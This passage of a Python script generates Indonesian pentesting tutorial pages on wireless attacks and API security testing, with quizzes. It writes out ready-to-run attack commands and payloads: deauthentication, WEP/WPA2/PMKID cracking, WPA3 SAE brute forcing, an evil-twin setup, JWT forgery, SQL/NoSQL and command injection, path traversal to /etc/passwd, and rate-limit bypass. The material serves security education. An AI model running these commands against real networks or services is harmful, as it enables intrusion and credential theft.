  --output-format pcap,csv

# 4. Capture handshake (dengan deauth)
sudo aireplay-ng --deauth 10 \\
  -a AA:BB:CC:DD:EE:FF \\
  -c 11:22:33:44:55:66 \\
  wlan0mon

# 5. Verifikasi handshake capture
aircrack-ng target_capture-01.cap

# =============================================
# Alternative: Kismet untuk passive scanning
# =============================================

# Start Kismet server
sudo kismet -c wlan0mon \\
  --override wardrive

# Kismet akan mendeteksi:
# - SSID dan BSSID
# - Channel dan encryption
# - Client devices
# - Hidden SSIDs
# - Rogue access points</pre>
      </div>

      <h3>Active Scanning dengan Nmap</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Nmap Wireless Scan</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Active Wireless Scanning
# =============================================

# Scan untuk WiFi Direct devices
sudo nmap --script=broadcast-wifi-direct

# Scan connected clients pada AP tertentu
sudo nmap -sn 192.168.1.0/24 \\
  --script=broadcast-ping

# Enumerate client yang terhubung
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --station-only</pre>
      </div>
'''),
            ('''      <h2 id="wep-cracking">4. WEP Cracking</h2>
      <p>WEP (Wired Equivalent Privacy) menggunakan enkripsi RC4 dengan IV 24-bit yang sangat lemah. WEP dapat dipecahkan dalam hitungan menit dengan traffic yang cukup. Meskipun WEP sudah deprecated, masih ada perangkat legacy yang menggunakannya.</p>

      <h3>WEP Cracking Process</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WEP Cracking</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WEP Cracking Steps
# =============================================

# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Capture IVs dari target WEP network
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 11 \\
  --write wep_capture \\
  --output-format pcap

# Step 3: Generate more traffic (ARP replay attack)
sudo aireplay-ng --arpreplay \\
  -b AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC_ADDRESS \\
  wlan0mon

# Step 4: Korelasi serangan (fake authentication)
sudo aireplay-ng --fakeauth 30 \\
  -a AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC_ADDRESS \\
  wlan0mon

# Step 5: Crack WEP key setelah ~20,000+ IVs
sudo aircrack-ng wep_capture-01.cap

# Output: KEY FOUND! [ 1A:2B:3C:4D:5E ]

# Alternatif: Fragmentation attack
sudo aireplay-ng --fragment \\
  -b AA:BB:CC:DD:EE:FF \\
  -h YOUR_MAC_ADDRESS \\
  wlan0mon</pre>
      </div>

      <div class="info-box info"><div class="info-box-title">💡 Catatan</div>
        <p>WEP cracking membutuhkan minimal 20,000 IVs untuk 64-bit key dan 40,000 IVs untuk 128-bit key. Dengan ARP replay attack, ini bisa dicapai dalam 5-10 menit. Semua organisasi HARUS sudah beralih ke WPA2/WPA3.</p>
      </div>
'''),
            ('''      <h2 id="wpa-cracking">5. WPA/WPA2 Cracking</h2>
      <p>WPA2 menggunakan AES-CCMP yang secara kriptografis kuat. Namun, WPA2-PSK (Pre-Shared Key) rentan terhadap dictionary attack jika password lemah. Serangan utama adalah menangkap 4-way handshake lalu melakukan offline brute force.</p>

      <h3>Handshake Capture & Cracking</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA2 Cracking</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WPA2-PSK Cracking
# =============================================

# Step 1: Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Scan target network
sudo airodump-ng wlan0mon \\
  --band abg \\
  --write wpa_scan

# Step 3: Capture handshake
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --write wpa_handshake

# Step 4: Force client reconnect (deauth)
sudo aireplay-ng --deauth 5 \\
  -a AA:BB:CC:DD:EE:FF \\
  wlan0mon

# Step 5: Verify handshake captured
aircrack-ng wpa_handshake-01.cap

# Step 6: Dictionary attack
aircrack-ng wpa_handshake-01.cap \\
  -w /usr/share/wordlists/rockyou.txt \\
  -b AA:BB:CC:DD:EE:FF

# =============================================
# Alternative: Hashcat (GPU accelerated)
# =============================================

# Convert capture to hashcat format
hcxpcapngtool wpa_handshake-01.cap \\
  -o wpa_hash.hc22000

# Brute force dengan GPU
hashcat -m 22000 wpa_hash.hc22000 \\
  /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8 char lowercase + digits)
hashcat -m 22000 wpa_hash.hc22000 \\
  -a 3 ?l?l?l?l?l?l?d?d

# =============================================
# PMKID Attack (tanpa deauth/client)
# =============================================

# Capture PMKID
sudo hcxdumptool -i wlan0mon \\
  --filterlist_ap=target.txt \\
  --filtermode=2 \\
  -o pmkid_capture.pcapng

# Convert dan crack
hcxpcapngtool pmkid_capture.pcapng \\
  -o pmkid_hash.hc22000
hashcat -m 22000 pmkid_hash.hc22000 \\
  /usr/share/wordlists/rockyou.txt</pre>
      </div>
'''),
            ('''      <h2 id="wpa3">6. WPA3 Security</h2>
      <p>WPA3 memperkenalkan <strong>SAE (Simultaneous Authentication of Equals)</strong> yang menggantikan PSK, memberikan perlindungan terhadap offline dictionary attack dan forward secrecy.</p>

      <h3>WPA3 Improvements</h3>
      <ul>
        <li><strong>SAE (Dragonfly)</strong> — Menghilangkan offline dictionary attack</li>
        <li><strong>Forward Secrecy</strong> — Setiap session menggunakan key unik</li>
        <li><strong>192-bit Security Suite</strong> — Untuk enterprise/government</li>
        <li><strong>Protected Management Frames (PMF)</strong> — Wajib di WPA3</li>
      </ul>

      <h3>Known WPA3 Attacks</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WPA3/SAE Side-Channel Attacks</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# WPA3 Dragonblood Attacks (Research)
# =============================================

# Note: Ini untuk research dan testing saja
# Dragonblood CVE-2019-9494, CVE-2019-9495

# 1. SAE side-channel attack (password partitioning)
# Menurunkan kompleksitas brute force

# 2. Cache-based attack
# Mengamati timing SAE untuk memfilter password

# 3. Transition Disable Attack
# Memaksa downgrade ke WPA2
# Tools: wacker (WPA3 SAE brute force)

# Install wacker
git clone https://github.com/blunderbuss-wctf/wacker
cd wacker
pip3 install -r requirements.txt

# Run SAE brute force
sudo python3 wacker.py \\
  --wordlist wordlist.txt \\
  --ssid "TargetWiFi" \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --interface wlan0mon

# Defense against downgrade:
# - Enable Protected Management Frames
# - Disable WPA2/TKIP transition mode
# - Monitor for deauth attacks</pre>
      </div>
'''),
            ('''      <h2 id="evil-twin">7. Evil Twin & Karma Attack</h2>
      <p><strong>Evil Twin</strong> adalah serangan di mana attacker membuat access point palsu yang meniru SSID target. Ketika korban terhubung, attacker dapat melakukan man-in-the-middle, credential harvesting, dan captive portal phishing.</p>

      <h3>Evil Twin Setup</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Evil Twin Attack</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Evil Twin Access Point Setup
# =============================================

# Step 1: Create hostapd configuration
cat > hostapd_evil.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Step 2: Configure DHCP (dnsmasq)
cat > dnsmasq_evil.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.100.10,192.168.100.50,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Step 3: Setup IP and routing
sudo ifconfig wlan1 192.168.100.1 netmask 255.255.255.0
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 4: Start services
sudo hostapd hostapd_evil.conf &
sudo dnsmasq -C dnsmasq_evil.conf &

# Step 5: Deauth clients dari AP asli
sudo aireplay-ng --deauth 0 \\
  -a AA:BB:CC:DD:EE:FF \\
  wlan0mon

# Step 6: Captive portal (optional)
# Install nodogsplash atau iptables redirect
sudo iptables -t nat -A PREROUTING \\
  -i wlan1 -p tcp --dport 80 \\
  -j DNAT --to-destination 192.168.100.1:80</pre>
      </div>

      <div class="warning-box"><div class="info-box-title">⚠️ Etika Penting</div>
        <p>Evil Twin attack hanya untuk testing terotorisasi. Menggunakan teknik ini tanpa izin adalah kejahatan serius yang dapat mengakibatkan penjara. Selalu pastikan Anda memiliki surat izin sebelum melakukan serangan ini.</p>
      </div>
'''),
            ('''      <h2 id="reporting">8. Reporting & Remediation</h2>
      <p>Hasil wireless pentest harus didokumentasikan dalam laporan yang komprehensif dengan temuan, severity, dan rekomendasi remediation yang jelas.</p>

      <h3>Common Findings & Remediation</h3>
      <table class="net-table"><thead><tr><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead><tbody>
        <tr><td>WEP encryption in use</td><td>Critical</td><td>Migrasi ke WPA3 atau minimal WPA2-AES</td></tr>
        <tr><td>WPA2 dengan password lemah</td><td>High</td><td>Gunakan password 12+ karakter, kombinasi kompleks</td></tr>
        <tr><td>Rogue AP terdeteksi</td><td>High</td><td>Lokasi dan hapus, implementasi WIDS</td></tr>
        <tr><td>Open network tanpa autentikasi</td><td>Medium</td><td>Tambahkan WPA2-Enterprise + 802.1X</td></tr>
        <tr><td>Management frame tanpa proteksi</td><td>Medium</td><td>Enable PMF (802.11w)</td></tr>
        <tr><td>SSID broadcast off (security by obscurity)</td><td>Low</td><td>Tidak efektif, fokus pada enkripsi yang kuat</td></tr>
      </tbody></table>
'''),
        ],
        "quiz": [
            {"q": "1. Apa kepanjangan dari SAE dalam WPA3?", "options": ["Secure Authentication Engine", "Simultaneous Authentication of Equals", "Standard AES Encryption", "Session Authentication Element"], "correct": "1"},
            {"q": "2. Tool apa yang digunakan untuk menangkap 4-way handshake WPA2?", "options": ["nmap", "aircrack-ng/airodump-ng", "wireshark", "tcpdump"], "correct": "1"},
            {"q": "3. Berapa minimum IVs yang dibutuhkan untuk crack WEP 64-bit?", "options": ["1,000", "5,000", "20,000", "100,000"], "correct": "2"},
            {"q": "4. Apa itu Evil Twin attack?", "options": ["Serangan DDoS pada AP", "Membuat AP palsu yang meniru SSID target", "Cracking password dengan brute force", "Menginfeksi firmware AP"], "correct": "1"},
            {"q": "5. Mode apa yang harus diaktifkan pada wireless adapter untuk melakukan packet sniffing?", "options": ["Promiscuous mode", "Monitor mode", "Managed mode", "Ad-hoc mode"], "correct": "1"},
        ],
    },
]

# Add remaining 7 articles
articles += [
    {
        "filename": "api-security-testing.html",
        "title": "API Security Testing",
        "meta_desc": "Pelajari API Security Testing: OWASP API Top 10, REST API vulnerabilities, authentication bypass, injection attacks, dan API security best practices.",
        "keywords": "API Security Testing, OWASP API Top 10, REST API Security, API Penetration Testing, JWT Security",
        "difficulty": "lanjut",
        "difficulty_label": "Lanjut",
        "time": "15 menit",
        "subtitle": "Panduan lengkap API security testing — dari OWASP API Top 10, authentication testing, injection, rate limiting, hingga API gateway hardening",
        "toc": [
            ("pengenalan", "Pengenalan API Security"),
            ("owasp-top10", "OWASP API Top 10"),
            ("recon", "API Reconnaissance"),
            ("auth-testing", "Authentication Testing"),
            ("injection", "API Injection Attacks"),
            ("idor", "IDOR & BOLA"),
            ("rate-limiting", "Rate Limiting & Abuse"),
            ("best-practices", "Security Best Practices"),
            ("quiz", "Quiz Pemahaman"),
        ],
        "sections": [
            ('''      <h2 id="pengenalan">1. Pengenalan API Security Testing</h2>
      <p><strong>API Security Testing</strong> adalah proses evaluasi keamanan Application Programming Interface untuk menemukan kerentanan yang dapat dieksploitasi oleh attacker. Di era microservices dan cloud-native, API menjadi target utama serangan karena menjadi pintu masuk ke data dan layanan backend.</p>

      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div>
        <ul>
          <li>OWASP API Security Top 10 (2023)</li>
          <li>API reconnaissance dan enumeration</li>
          <li>Authentication & authorization testing</li>
          <li>Injection attacks pada API</li>
          <li>IDOR/BOLA vulnerability</li>
          <li>Rate limiting bypass</li>
          <li>API security best practices</li>
        </ul>
      </div>

      <h3>Mengapa API Security Penting?</h3>
      <p>Menurut Gartner, API menjadi vektor serangan utama pada tahun 2022. Beberapa fakta penting:</p>
      <ul>
        <li>95% organisasi mengalami masalah keamanan API dalam 12 bulan terakhir</li>
        <li>API-related breaches meningkat 600% sejak 2020</li>
        <li>Rata-rata organisasi memiliki 15,000+ API dalam produksi</li>
      </ul>
'''),
            ('''      <h2 id="owasp-top10">2. OWASP API Security Top 10 (2023)</h2>
      <p>OWASP API Security Top 10 adalah panduan referensi yang mengidentifikasi risiko keamanan API paling kritis.</p>

      <table class="net-table"><thead><tr><th>#</th><th>Risiko</th><th>Deskripsi</th></tr></thead><tbody>
        <tr><td>API1</td><td>Broken Object Level Authorization</td><td>Attacker bisa mengakses objek milik user lain</td></tr>
        <tr><td>API2</td><td>Broken Authentication</td><td>Mekanisme autentikasi lemah atau salah implementasi</td></tr>
        <tr><td>API3</td><td>Broken Object Property Level Auth</td><td>Excess data exposure, mass assignment</td></tr>
        <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>Tidak ada rate limiting, resource exhaustion</td></tr>
        <tr><td>API5</td><td>Broken Function Level Authorization</td><td>Access admin function tanpa authorization</td></tr>
        <tr><td>API6</td><td>Unrestricted Access to Sensitive Business Flows</td><td>Automated abuse of business logic</td></tr>
        <tr><td>API7</td><td>Server Side Request Forgery</td><td>API melakukan request ke internal resource</td></tr>
        <tr><td>API8</td><td>Security Misconfiguration</td><td>Default config, verbose errors, CORS misconfigured</td></tr>
        <tr><td>API9</td><td>Improper Inventory Management</td><td>Shadow API, deprecated endpoints masih aktif</td></tr>
        <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Mengkonsumsi API tanpa validasi response</td></tr>
      </tbody></table>
'''),
            ('''      <h2 id="recon">3. API Reconnaissance</h2>
      <p>Langkah pertama adalah menemukan semua endpoint API, memahami struktur request/response, dan mengidentifikasi fungsionalitas yang tersedia.</p>

      <h3>API Discovery Techniques</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — API Reconnaissance</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# API Reconnaissance Techniques
# =============================================

# 1. Check common API documentation endpoints
curl -s https://target.com/swagger.json | jq .
curl -s https://target.com/openapi.json | jq .
curl -s https://target.com/api-docs/ | head -50
curl -s https://target.com/v1/api-docs/ | head -50
curl -s https://target.com/graphql | head -50

# 2. Directory bruteforce untuk API endpoints
ffuf -u https://target.com/api/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\
  -mc 200,201,401,403 \\
  -H "Accept: application/json"

# 3. Parameter discovery
arjun -u https://target.com/api/users

# 4. GraphQL introspection
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name,args{name}}}}}"}'

# 5. API versioning enumeration
for v in v1 v2 v3 api; do
  curl -s -o /dev/null -w "%{http_code}" \\
    "https://target.com/$v/users"
  echo " → /$v/users"
done

# 6. Verbose error information gathering
curl -X POST https://target.com/api/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"test","password":"test123"}'
# Perhatikan error message yang mengungkap info</pre>
      </div>
'''),
            ('''      <h2 id="auth-testing">4. Authentication Testing</h2>
      <p>API authentication yang lemah memungkinkan attacker mengakses resource tanpa kredensial yang valid atau mengambil alih akun user lain.</p>

      <h3>JWT Token Attacks</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — JWT Attack Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# JWT Security Testing
# =============================================

# Decode JWT token
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.signature" \\
  | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Attack 1: Algorithm None
# Ubah header: {"alg":"none","typ":"JWT"}
# Hapus signature

# Attack 2: Algorithm Confusion (RS256 -> HS256)
# Jika server menggunakan RS256, ubah ke HS256
# Gunakan public key sebagai secret

# Attack 3: Weak Secret Brute Force
hashcat -m 16500 jwt_token.txt \\
  /usr/share/wordlists/rockyou.txt

# Attack 4: kid injection
# Jika JWT header memiliki "kid" parameter:
# {"kid":"../../dev/null","alg":"HS256"}
# Ini bisa bypass signature verification

# Contoh JWT manipulation dengan Python
python3 << 'PYEOF'
import jwt
import json

# Original token
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Original payload: {json.dumps(decoded, indent=2)}")

# Modify payload
decoded["role"] = "admin"
decoded["sub"] = "admin"

# Encode with none algorithm
forged = jwt.encode(decoded, "", algorithm="none")
print(f"Forged token: {forged}")
PYEOF</pre>
      </div>
'''),
            ('''      <h2 id="injection">5. API Injection Attacks</h2>
      <p>Injection pada API bisa terjadi pada parameter, header, atau body request. SQL injection, NoSQL injection, dan command injection adalah yang paling umum.</p>

      <h3>NoSQL Injection pada MongoDB API</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — NoSQL Injection Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# NoSQL Injection Testing
# =============================================

# Authentication Bypass
curl -X POST https://target.com/api/login \\
  -H "Content-Type: application/json" \\
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'

# Operator Injection di query parameter
curl "https://target.com/api/users?role[$ne]=user"

# Regex Injection
curl "https://target.com/api/search?name[$regex]=.*"

# $where Injection (JavaScript execution)
curl -X POST https://target.com/api/users \\
  -H "Content-Type: application/json" \\
  -d '{
    "name": "test",
    "email": {"$where": "return true"}
  }'

# SQL Injection pada REST API
curl "https://target.com/api/users?id=1' OR 1=1--"
curl "https://target.com/api/users?id=1 UNION SELECT null,username,password FROM users--"

# Command Injection via API parameter
curl -X POST https://target.com/api/tools/ping \\
  -H "Content-Type: application/json" \\
  -d '{"host": "127.0.0.1; cat /etc/passwd"}'

# GraphQL Injection
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{
    "query": "{ users(filter: \"{\\\"role\\\": \\\"admin\\\"}\") { id, name, email } }"
  }'</pre>
      </div>
'''),
            ('''      <h2 id="idor">6. IDOR & BOLA</h2>
      <p><strong>IDOR (Insecure Direct Object Reference)</strong> atau <strong>BOLA (Broken Object Level Authorization)</strong> adalah kerentanan #1 di OWASP API Top 10. Terjadi ketika API memungkinkan user mengakses objek milik user lain hanya dengan mengubah identifier.</p>

      <h3>Testing IDOR</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — IDOR Testing</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# IDOR/BOLA Testing
# =============================================

# Test 1: Sequential ID enumeration
# Dengan token user A, coba akses resource user B
curl -H "Authorization: Bearer TOKEN_USER_A" \\
  https://target.com/api/users/1001/profile

curl -H "Authorization: Bearer TOKEN_USER_A" \\
  https://target.com/api/users/1002/profile

# Test 2: UUID prediction
curl -H "Authorization: Bearer TOKEN_USER_A" \\
  https://target.com/api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890/profile

# Test 3: Parameter pollution
curl -H "Authorization: Bearer TOKEN_USER_A" \\
  "https://target.com/api/users?id=self&id=1002"

# Test 4: Method change
# GET yang hanya bisa diakses owner, coba dengan method lain
curl -X POST -H "Authorization: Bearer TOKEN_USER_A" \\
  https://target.com/api/users/1002/profile

# Test 5: Path traversal di resource path
curl -H "Authorization: Bearer TOKEN_USER_A" \\
  https://target.com/api/documents/../../../etc/passwd

# Test 6: Batch request abuse
curl -X POST https://target.com/api/batch \\
  -H "Authorization: Bearer TOKEN_USER_A" \\
  -H "Content-Type: application/json" \\
  -d '[
    {"method":"GET","url":"/api/users/1001/profile"},
    {"method":"GET","url":"/api/users/1002/profile"},
    {"method":"GET","url":"/api/users/1003/profile"}
  ]'</pre>
      </div>
'''),
            ('''      <h2 id="rate-limiting">7. Rate Limiting & Abuse</h2>
      <p>API tanpa rate limiting rentan terhadap brute force, credential stuffing, dan resource exhaustion.</p>

      <h3>Rate Limit Bypass Techniques</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Rate Limit Bypass</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Rate Limit Bypass Testing
# =============================================

# Technique 1: IP rotation via headers
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " \\
    -H "X-Forwarded-For: 10.0.0.$i" \\
    -H "X-Real-IP: 10.0.0.$i" \\
    -H "X-Originating-IP: 10.0.0.$i" \\
    https://target.com/api/login \\
    -d "username=admin&password=pass$i"
  echo "attempt $i"
done

# Technique 2: Header manipulation
curl -H "X-Forwarded-For: 127.0.0.1" \\
  https://target.com/api/login

# Technique 3: Request smuggling
# Menggunakan Content-Length vs Transfer-Encoding

# Technique 4: Distributed attack
# Menggunakan multiple IP addresses

# Technique 5: Parameter pollution
curl "https://target.com/api/login?user=admin&user=admin2&pass=test"</pre>
      </div>
'''),
            ('''      <h2 id="best-practices">8. API Security Best Practices</h2>
      <p>Berikut adalah rekomendasi keamanan API berdasarkan standar industri dan OWASP guidelines.</p>

      <h3>Security Checklist</h3>
      <table class="net-table"><thead><tr><th>Kontrol</th><th>Implementasi</th></tr></thead><tbody>
        <tr><td><strong>Authentication</strong></td><td>OAuth 2.0 + JWT, API keys rotated, MFA untuk admin</td></tr>
        <tr><td><strong>Authorization</strong></td><td>RBAC/ABAC, validate setiap request, principle of least privilege</td></tr>
        <tr><td><strong>Input Validation</strong></td><td>Schema validation, allowlist input, type checking</td></tr>
        <tr><td><strong>Rate Limiting</strong></td><td>Per-user, per-IP, sliding window, progressive penalties</td></tr>
        <tr><td><strong>Encryption</strong></td><td>TLS 1.3 mandatory, encrypt sensitive fields at rest</td></tr>
        <tr><td><strong>Logging</strong></td><td>Log semua akses, tamper-proof audit trail</td></tr>
        <tr><td><strong>Error Handling</strong></td><td>Generic error messages, no stack traces in production</td></tr>
      </tbody></table>

      <div class="code-block"><div class="code-header"><span class="code-lang">Python — API Security Middleware</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# API Security Middleware — Flask Example
# =============================================

from flask import Flask, request, jsonify
from functools import wraps
import time
import hashlib
import hmac

app = Flask(__name__)

# Rate limiter
rate_limit_store = {}

def rate_limit(max_requests=100, window=60):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            client_ip = request.remote_addr
            now = time.time()
            key = f"{client_ip}:{f.__name__}"

            if key not in rate_limit_store:
                rate_limit_store[key] = []

            # Clean old entries
            rate_limit_store[key] = [
                t for t in rate_limit_store[key]
                if now - t < window
            ]

            if len(rate_limit_store[key]) >= max_requests:
                return jsonify({"error": "Rate limit exceeded"}), 429

            rate_limit_store[key].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Input validation decorator
def validate_json(schema):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            data = request.get_json(silent=True)
            if not data:
                return jsonify({"error": "Invalid JSON"}), 400
            for field in schema.get("required", []):
                if field not in data:
                    return jsonify({"error": f"Missing: {field}"}), 400
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route("/api/users", methods=["POST"])
@rate_limit(max_requests=10, window=60)
@validate_json({"required": ["name", "email"]})
def create_user():
    data = request.get_json()
    # Sanitize input
    name = data["name"][:100]  # Limit length
    email = data["email"][:254]
    return jsonify({"status": "created"}), 201</pre>
      </div>
'''),
        ],
        "quiz": [
            {"q": "1. Apa peringkat #1 di OWASP API Security Top 10 2023?", "options": ["Broken Authentication", "Broken Object Level Authorization (BOLA)", "SQL Injection", "Security Misconfiguration"], "correct": "1"},
            {"q": "2. Serangan apa yang mengubah JWT header 'alg' dari RS256 ke HS256?", "options": ["Replay Attack", "Algorithm Confusion Attack", "Token Theft", "Session Hijacking"], "correct": "1"},
            {"q": "3. Apa fungsi dari rate limiting pada API?", "options": ["Mempercepat response API", "Mencegah brute force dan resource exhaustion", "Mengenkripsi data", "Mengautentikasi user"], "correct": "1"},
            {"q": "4. Teknik apa yang digunakan untuk menemukan hidden API endpoints?", "options": ["Port scanning", "Directory bruteforce", "SQL injection", "ARP spoofing"], "correct": "1"},
            {"q": "5. Apa itu NoSQL injection?", "options": ["Injection pada SQL databases", "Injection pada NoSQL databases seperti MongoDB menggunakan operator seperti $gt", "Serangan DDoS pada database", "Password cracking pada NoSQL"], "correct": "1"},
        ],
    },
]


def build_article(a):
    """Build complete HTML article."""
    # Build TOC
    toc_html = ""
    for tid, tname in a["toc"]:
        toc_html += f'      <li><a href="#{tid}">{tname}</a></li>\n'

    # Build sections
    sections_html = "\n".join(a["sections"])

    # Build quiz
    quiz_html = ""
    for i, q in enumerate(a["quiz"], 1):
        options_html = ""
        for j, opt in enumerate(q["options"]):
            options_html += f'          <label><input type="radio" name="q{i}" value="{j}"> {opt}</label>\n'
        quiz_html += f'''        <div class="quiz-question" data-correct="{q['correct']}">
          <p><strong>{q['q']}</strong></p>
{options_html}        </div>
'''

    # Build article:section meta value
    article_section = "Keamanan"

    html = f'''<!DOCTYPE html>
<html lang="id" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="../css/style.css?v=13.3">
  <link rel="stylesheet" href="../css/mobile-quick-menu.css">
  <title>{a["title"]} | BeebaneLabs</title>
  <meta name="description" content="{a["meta_desc"]}">
  <meta name="keywords" content="{a["keywords"]}">
  <meta name="author" content="BeebaneLabs">
  <meta property="article:published_time" content="2026-06-29">
  <meta property="article:section" content="{article_section}">
  <meta property="og:title" content="{a["title"]} - BeebaneLabs">
  <meta property="og:description" content="{a["meta_desc"]}">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://beebanelabs.com/articles/{a["filename"]}">
  <meta property="og:image" content="../images/logo_beebane.png">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐝</text></svg>">
<script>
(function(){{var src='https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2122797411859663';function loadAds(){{if(window._adsLoaded)return;window._adsLoaded=true;var s=document.createElement('script');s.async=true;s.crossOrigin='anonymous';s.src=src;document.head.appendChild(s);['scroll','mousedown','touchstart','keydown'].forEach(function(e){{document.removeEventListener(e,loadAds,{{passive:true}})}})}}['scroll','mousedown','touchstart','keydown'].forEach(function(e){{document.addEventListener(e,loadAds,{{passive:true,once:true}})}});setTimeout(loadAds,5000)}})();
</script>
</head>
<body>
  <noscript><style>.article-content{{display:block!important}}</style></noscript>
  <a href="#main-content" class="skip-link">Skip ke konten utama</a>
  <div class="reading-progress-bar" id="readingProgress"></div>
  <nav class="navbar" id="navbar"><div class="navbar-inner"><a href="../index.html" class="navbar-brand"><img src="../images/logo_beebane.png" alt="BeebaneLabs" class="brand-logo" width="40" height="22"></a><ul class="navbar-links" id="navLinks"><li><a href="../index.html">Beranda</a></li><li><a href="../kategori.html">Kategori</a></li><li><a href="../about.html">Tentang</a></li><li><a href="../pricing.html">Harga</a></li></ul><div class="navbar-search" id="searchTrigger"><span>Cari tutorial...</span></div><div id="authNavArea"></div><button class="menu-toggle" id="menuToggle" aria-label="Toggle menu"><span></span><span></span><span></span></button></div></nav>
  <div class="search-overlay" id="searchOverlay"><button class="search-close-btn" onclick="document.getElementById('searchOverlay').classList.remove('active')">&times;</button><div class="search-box"><div class="search-input-wrapper"><input type="text" id="searchInput" placeholder="Cari tutorial..."></div><div class="search-results" id="searchResults"><div class="search-hint">Ketik untuk mencari</div></div></div></div>
  <section class="article-hero"><div class="container"><div class="breadcrumb"><a href="../index.html">Beranda</a><span class="separator">/</span><a href="../index.html#categories">Keamanan</a><span class="separator">/</span><span class="current">{a["title"]}</span></div><span class="category-tag">Keamanan</span><h1>{a["title"]}</h1><p class="article-subtitle">{a["subtitle"]}</p><div class="article-meta"><span>📅 29 Juni 2026</span><span>📖 {a["time"]} baca</span><span class="difficulty {a["difficulty"]}">{a["difficulty_label"]}</span></div></div></section>
  <div class="container"><div class="ad-slot ad-slot-wide"></div></div>
  <article class="article-content" id="main-content"><div class="container">
    <div class="info-box info"><div class="info-box-title">📋 Daftar Isi</div><ol>
{toc_html}    </ol></div>
{sections_html}
      <h2 id="quiz">{len(a["toc"])}. Quiz Pemahaman</h2>
      <div class="quiz-container">
{quiz_html}        <button class="quiz-submit" onclick="checkQuiz(this)">Periksa Jawaban</button>
        <div class="quiz-result"></div>
      </div>
      <h3>Rangkuman</h3>
      <div class="info-box info"><div class="info-box-title">📝 Poin Penting</div><ul>
        <li>Materi ini membahas {a["title"]} secara komprehensif</li>
        <li>Praktikkan semua teknik dalam environment yang terotorisasi</li>
        <li>Keamanan adalah proses berkelanjutan, bukan tujuan akhir</li>
      </ul></div>
  </div></article>
  <script src="../js/app.js?v=9.5"></script>
<script>if('serviceWorker' in navigator){{window.addEventListener('load',()=>{{navigator.serviceWorker.register('/sw.js').catch(()=>{{}})}})}}</script>
</body>
</html>'''
    return html


if __name__ == "__main__":
    for a in articles:
        path = os.path.join(OUTPUT_DIR, a["filename"])
        content = build_article(a)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        line_count = content.count("\n") + 1
        print(f"Created {a['filename']} — {line_count} lines")
